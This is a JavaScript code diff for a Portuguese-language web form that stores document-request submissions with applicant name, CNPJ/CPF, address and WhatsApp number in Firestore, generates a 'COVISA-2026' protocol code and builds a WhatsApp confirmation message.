-                  alert("Selecione e comprove pelo menos um documento.");
-                  btnSubmit.innerHTML = textoOriginal; btnSubmit.disabled = false; return; 
-              }
+              // Permite enviar mesmo se o cliente ainda não tiver nenhum documento em mãos
 
               const listaEvidencias = [];
               for (let i = 0; i < arquivosParaProcessar.length; i++) {
@@ -3088,20 +3428,27 @@
               const num = document.getElementById('end_num') ? document.getElementById('end_num').value : "";
               const bairro = document.getElementById('end_bairro') ? document.getElementById('end_bairro').value : "";
               const cidadeUF = document.getElementById('end_cidade') ? document.getElementById('end_cidade').value : "";
+              const telefoneSolic = document.getElementById('whatsapp_solicitante') ? document.getElementById('whatsapp_solicitante').value.trim() : "";
 
+              if (telefoneSolic && typeof window.atualizarDadosNegocioMonitor === 'function') {
+                  window.atualizarDadosNegocioMonitor({ telefoneDigitado: telefoneSolic });
+              }
+
+              const dataEnvioStr = new Date().toLocaleString('pt-BR');
               const payloadBase = {
-                  nome: nomeFinal, cnpj: cnpj, tipo: tipo, docs: docsTextAdmin,
+                  nome: nomeFinal, cnpj: cnpj, telefone: telefoneSolic, tipo: tipo, docs: docsTextAdmin,
                   valor: null, pago: false,
                   cep: cep, rua: rua, num: num, bairro: bairro, cidadeUF: cidadeUF,
-                  data: new Date().toLocaleString()
+                  data: dataEnvioStr
               };
 
               const tamanhoTotalBytes = new Blob([JSON.stringify({ ...payloadBase, evidencias: listaEvidencias })]).size;
+              let pedidoCriadoRef = null;
 
               if (tamanhoTotalBytes <= 780000) {
                   etapaAtual = "Salvando protocolo e anexos no banco de dados (Firestore)";
                   btnSubmit.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando ao banco de dados...';
-                  await addDoc(collection(db, "pedidos"), {
+                  pedidoCriadoRef = await addDoc(collection(db, "pedidos"), {
                       ...payloadBase,
                       evidencias: listaEvidencias,
                       evidencias_em_subcolecao: false,
@@ -3116,6 +3463,7 @@
                       evidencias_em_subcolecao: true,
                       total_evidencias: listaEvidencias.length
                   });
+                  pedidoCriadoRef = pedidoRef;
 
                   try {
                       for (let i = 0; i < listaEvidencias.length; i++) {
@@ -3133,10 +3481,26 @@
                   }
               }
 
+              const idGerado = pedidoCriadoRef ? pedidoCriadoRef.id : String(Date.now());
+              const codProtocolo = `COVISA-2026-${idGerado.substring(0, 6).toUpperCase()}`;
+              window._ultimoProtocoloGerado = {
+                  id: idGerado,
+                  codigo: codProtocolo,
+                  nome: nomeFinal,
+                  cnpj: cnpj,
+                  telefone: telefoneSolic,
+                  tipo: tipo,
+                  endereco: [rua, num ? `nº ${num}` : '', bairro, cidadeUF].filter(Boolean).join(', '),
+                  data: dataEnvioStr
+              };
+
               if (typeof window.registrarEtapaFunil === 'function') {
-                  window.registrarEtapaFunil('enviou', `Protocolo enviado com sucesso (${listaEvidencias.length} anexo(s))`);
+                  window.registrarEtapaFunil('enviou', `Protocolo ${codProtocolo} enviado (${listaEvidencias.length} anexo(s))`);
               }
-              const msgAnalise = `*COMPROVANTE DE PROTOCOLO GERADO*\n\n*Empresa/Pessoa:* ${nomeFinal}\n*CNPJ/CPF:* ${cnpj}\n\nSeus documentos foram enviados para análise técnica. Guarde esta mensagem. O seu processo já está no sistema!`;
+              const badgeProtEl = document.getElementById('success-protocolo-badge');
+              if (badgeProtEl) badgeProtEl.innerText = codProtocolo;
+
+              const msgAnalise = `*COMPROVANTE DE PROTOCOLO GERADO*\n*Protocolo:* ${codProtocolo}\n*Empresa/Pessoa:* ${nomeFinal}\n*CNPJ/CPF:* ${cnpj}\n*WhatsApp:* ${telefoneSolic}\n\nSeus documentos foram enviados para análise técnica. O processo já está ativo no sistema!`;
               const urlWhatsAnalise = "https://api.whatsapp.com/send?phone=5511920665012&text=" + encodeURIComponent(msgAnalise);
               
               document.getElementById('btn-whats-comprovante').onclick = function() {
@@ -3151,8 +3515,7 @@
               document.getElementById('btn-enviar-whatsapp').style.display = 'none';
               window.limparCamposEndereco();
               
-              window.alternarAba('pagamento');
-              document.getElementById('consulta_cnpj').value = cnpj;
+              window.iniciarAcompanhamentoTempoReal(idGerado, cnpj);
 
           } catch (error) {
               console.error("Erro detalhado no envio:", { etapaAtual, error });
